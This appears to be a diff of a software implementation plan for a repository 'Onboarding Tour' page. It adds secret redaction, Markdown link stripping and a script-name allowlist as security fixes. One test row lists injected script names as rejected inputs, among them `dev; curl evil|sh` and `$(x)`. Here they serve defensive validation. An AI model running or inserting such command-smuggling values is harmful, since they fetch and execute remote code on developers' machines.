@@ -52,7 +52,7 @@ A per-repo "Onboarding Tour" page at `/repos/:repoId/onboarding-tour`. It shows 
 - RQ36 — The tour is returned only to members of the repo's workspace; 404 for another workspace's repo — confirmed — source: SPEC-02/AC-36
 - RQ37 — Index updated after the tour was generated → stale notice plus Regenerate — confirmed — source: SPEC-02/AC-37
 - RQ38 — Reopening a persisted tour makes no model call — confirmed — source: SPEC-02/AC-38
-- RQ39 — No tour → empty state with the exact copy and "+ Generate onboarding tour"; no call before the click — confirmed — source: SPEC-02/AC-39
+- RQ39 — No tour → empty state with the exact copy and a "Generate onboarding tour" button with a plus icon; no call before the click — confirmed — source: SPEC-02/AC-39
 - RQ40 — A new generation within 60 s of the previous start is rejected — assumed default — confirm (inherited from the spec) — source: SPEC-02/AC-40
 - RQ41 — "Open" → GitHub blob at the indexed SHA, in a new tab, with no opener — assumed default — confirm (inherited from the spec) — source: SPEC-02/AC-42
 - RQ42 — Copy strips the trailing `# comment` and announces "Copied" — assumed default — confirm (inherited from the spec) — source: SPEC-02/AC-43
@@ -61,7 +61,7 @@ A per-repo "Onboarding Tour" page at `/repos/:repoId/onboarding-tour`. It shows 
 - RQ45 — Generate with a checkout but no index → an index build is requested, the model call runs after it finishes, and "Indexing in progress" shows meanwhile — confirmed — source: SPEC-02/AC-46
 - RQ46 — Generate with an existing index → no re-index; "Re-analyze" offered when stale — confirmed — source: SPEC-02/AC-47
 - RQ47 — A section anchor in the URL → scroll to that section and expand it — confirmed — source: SPEC-02/AC-48
-- RQ48 — No "Share link"; breadcrumb "{owner/name} > Onboarding Tour" — confirmed — source: SPEC-02/AC-49
+- RQ48 — No "Share link"; breadcrumb "Workspace > Onboarding Tour" — confirmed — source: SPEC-02/AC-49
 - RQ49 — Activating a TOC item by click or keyboard → scroll it into view and expand it if collapsed — confirmed — source: SPEC-02/AC-50
 - RQ50 — First tasks come from the same single call: at most 3, each a title plus one file or dir path; ungrounded ones are dropped — confirmed — source: SPEC-02/AC-51
 - RQ51 — First-task cards are informational: no Open button, no click action — confirmed — source: SPEC-02/AC-52
@@ -71,6 +71,11 @@ A per-repo "Onboarding Tour" page at `/repos/:repoId/onboarding-tour`. It shows 
 - RQ55 — Model reasons only for the top 8 per list; entries 9–25 get a deterministic index fact — confirmed — source: SPEC-02/AC-56
 - RQ56 — The skeleton applies the same 8 / Show all / Show less rule, with index facts only — confirmed — source: SPEC-02/AC-57
 - RQ57 — An expanded list cut at 25 by the cap ends with the note "Top 25 of {M} indexed files by import rank" — confirmed — source: SPEC-02/AC-58
+- RQ58 — Plan-level (security review F2/F4, not a spec AC): secret values in docker-compose.yml, package.json, README and file excerpts are redacted before the model call (secret keys matched on whole segments, so `author:` is kept; token shapes `sk-`, `ghp_`, `AKIA`, PEM redacted); model text echoing a redacted value of ≥4 chars (non-trivial) is dropped from the saved tour — source: security review (P3 F2, F4)
+- RQ59 — Plan-level (security review F3, not a spec AC): the architecture summary is shown without external links or images (server strips link/image/URL syntax; client renders model Markdown with `a`/`img` disallowed); the vendored Markdown primitive keeps rendering links by default for other callers — source: security review (P3 F3)
+- RQ60 — Plan-level (decision 3, user-confirmed): "indexing" = a queued/running INDEX/REFRESH/RESYNC job for the repo inside `INDEX_JOB_WINDOW_MS` (420 s); older job rows count as orphaned — source: plan decision (supports SPEC-02/AC-28)
+- RQ61 — Plan-level (pr-self-review HIGH, not a spec AC): a package.json script is offered as `npm run <name>` only when its name is a plain script name (`^[A-Za-z0-9][\w:.-]*$`, e.g. `build`, `test:e2e`, `lint-fix`); names with spaces, `;`, `&&`, `|`, `$`, quotes or newlines are skipped, so they never reach the command list, the prompt or the Copy button — source: pr-self-review (supports SPEC-02/AC-15, AC-43)
+- RQ62 — Plan-level (pr-self-review HIGH, refines S11 focus rule): focus moves to Regenerate only when a rendered empty state is left; the initial load of an existing tour (loading → generated/skeleton) does not move focus — source: pr-self-review (supports SPEC-02/AC-45)
 
 ## Open questions & recommendations
 - Spec issues (non-blocking):
@@ -386,7 +391,7 @@ A per-repo "Onboarding Tour" page at `/repos/:repoId/onboarding-tour`. It shows 
   - `subline` ("Generated from index of {n} files · last refreshed {time}"), `sublinePartial` ("Generated from index of {n} of {m} files · last refreshed {time}")
   - `sublineSkeleton` ("Generated from index of {n} files"), `sublineSkeletonPartial` ("Generated from index of {n} of {m} files") — skeleton: index facts only, no "last refreshed" (review M6)
   - `partialNotice`, `onThisPage`, `sections.*`
-  - `empty.title` ("Generate onboarding tour"), `empty.body` (exact AC-39 text), `empty.cta` ("+ Generate onboarding tour")
+  - `empty.title` ("Generate onboarding tour"), `empty.body` (exact AC-39 text), `empty.cta` ("Generate onboarding tour"; the plus is the icon), `crumbWorkspace` ("Workspace")
   - `regenerate`, `retry`, `reanalyze`, `elapsed`, `stale` ("The index changed since this tour was generated")
   - `reasons.{flag_off:"Repository index is turned off", ai_output_invalid:"AI output invalid", ai_unavailable:"AI summary unavailable", index_failed, no_data, interrupted}`
   - `notCloned` ("Repository not cloned yet"), `indexing` ("Indexing in progress"), `noSupportedFiles` ("No supported source files indexed (.ts, .tsx, .js, .jsx, .mjs, .cjs)"), `noRunInstructions` ("No run instructions found in this repo")
@@ -421,7 +426,7 @@ A per-repo "Onboarding Tour" page at `/repos/:repoId/onboarding-tour`. It shows 
   - create `.../onboarding-tour/_components/OnboardingTourView/{OnboardingTourView.tsx,index.ts,constants.ts,helpers.ts,styles.ts}`:
     - `repoId === "_"` (`client/src/vendor/ui/nav.ts:73`) → `selectRepo` (AC-4)
     - `useRepoNotFound`; the repo comes from `useRepos()`
-    - `AppShell crumb=[{label: full_name}, {label: t("title")}]`, with no Share control (AC-49)
+    - `AppShell crumb=[{label: t("crumbWorkspace")}, {label: t("title")}]` (same pattern as Project Context / Pull Requests), with no Share control (AC-49)
     - `constants.ts` restates `SECTION_ORDER` and `VISIBLE_ENTRIES = 8`
     - `helpers.ts`:
       - `pickView(state)`:
@@ -519,7 +524,7 @@ A per-repo "Onboarding Tour" page at `/repos/:repoId/onboarding-tour`. It shows 
 | T20 | SPEC-02/AC-56 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | 25 entries, stub echoes reasons → 8 offered per list; persisted 9–25 `reason: null` with importer counts | server |
 | T21 | SPEC-02/AC-1, SPEC-02/AC-2 | component (RTL) | `client/src/components/app-shell/AppShell.test.tsx` (new) | Repo selected on `/repos/r1/onboarding-tour` → order Pull Requests, Onboarding Tour, Project Context; link `/repos/r1/onboarding-tour`, active | client |
 | T22 | SPEC-02/AC-3 | unit | `client/src/components/app-shell/helpers.test.ts` (new) | `/onboarding` → `""`; `/repos/x/onboarding-tour` → `onboarding-tour`; `/repos/x/context` → `context` | client |
-| T23 | SPEC-02/AC-4, SPEC-02/AC-5, SPEC-02/AC-49 | component (RTL) | `client/src/app/repos/[repoId]/onboarding-tour/page.test.tsx` (new) | repoId `_` → "Select a repository"; `acme/payments-api` → "Onboarding for payments-api", breadcrumb, no "Share link" | client |
+| T23 | SPEC-02/AC-4, SPEC-02/AC-5, SPEC-02/AC-49 | component (RTL) | `client/src/app/repos/[repoId]/onboarding-tour/page.test.tsx` (new) | repoId `_` → "Select a repository"; `acme/payments-api` → "Onboarding for payments-api", breadcrumb "Workspace > Onboarding Tour", no "Share link" | client |
 | T24 | SPEC-02/AC-6, SPEC-02/AC-7 | component (RTL) | same page test | Generated 4,800 → "Generated from index of 4,800 files · last refreshed …", absolute `title`; partial 5,000 + 7,450 → "5,000 of 12,450 files" plus notice; skeleton (`generatedAt: null`) → "Generated from index of 4,800 files" with no "last refreshed" | client |
 | T25 | SPEC-02/AC-39 | component (RTL) | same page test | No tour → title, exact body, one CTA; no POST until click; click → one POST | client |
 | T26 | SPEC-02/AC-22, SPEC-02/AC-23, SPEC-02/AC-26, SPEC-02/AC-29, SPEC-02/AC-30 | component (RTL) | same page test | `flag_off` → "Repository index is turned off"; failed index → "Re-analyze" POSTs `/resync`; `ai_unavailable` → "AI summary unavailable" plus Retry; `ai_output_invalid` → "AI output invalid"; first tasks placeholder | client |
@@ -537,6 +542,11 @@ A per-repo "Onboarding Tour" page at `/repos/:repoId/onboarding-tour`. It shows 
 | T38 | SPEC-02/AC-40 | component (RTL) | same page test | POST answered 429 `{ code:'onboarding_cooldown', details:{ retryAfterSeconds: 42 } }` → alert "Try again in 42s" | client |
 | T39 | SPEC-02/AC-37 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Tour generated at sha `abc`; index state touched (updated_at later, same sha) → `stale: false`; `last_indexed_sha` → `def` → `stale: true` | server |
 | T40 | SPEC-02/AC-34 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Seeded `running` row with `started_at = now() - 10 min` (orphan) → GET latestGeneration `failed`/`interrupted`; POST → 202 with a new generation id | server |
+| T41 | RQ58 | unit + it | `server/test/onboarding-redaction.test.ts`, `server/test/onboarding.it.test.ts` | Compose/package/README secrets redacted, `author:` kept, 4-char echoed secret detected, trivial values ignored; it: a literal compose secret never reaches the model and an echoing summary is dropped | server |
+| T42 | RQ59 | unit + component | `server/test/onboarding-redaction.test.ts`, `client/.../ArchitectureBody/ArchitectureBody.test.tsx`, `client/src/test/markdown-primitive.test.tsx` | Summary with image/link/bare URL → stripped server-side; rendered summary has no `<a>`/`<img>`, link text kept; Markdown primitive still renders links by default | server, client |
+| T43 | RQ60 | it (Testcontainers) | `server/test/repo-intel-tour-facts.it.test.ts`, `server/test/onboarding.it.test.ts` | Queued job now → indexing; running job 8 min old → not indexing; another repo's job → not indexing | server |
+| T44 | RQ61 | unit | `server/test/onboarding-helpers.test.ts` | Scripts `dev`, `test:e2e`, `lint-fix` → offered; `dev; curl evil\|sh`, `build\ncurl x`, `a && b`, `$(x)` → not offered; model command naming a skipped script is dropped | server |
+| T45 | RQ62, SPEC-02/AC-45 | component (RTL) | `client/src/app/repos/[repoId]/onboarding-tour/page.test.tsx` | Existing tour loads → Regenerate does not have focus; empty state → click CTA → Regenerate gets focus; Regenerate focused by the user stays focused after finish/fail | client |
 
 No SPEC-02 AC has `verify: e2e | manual`.
 
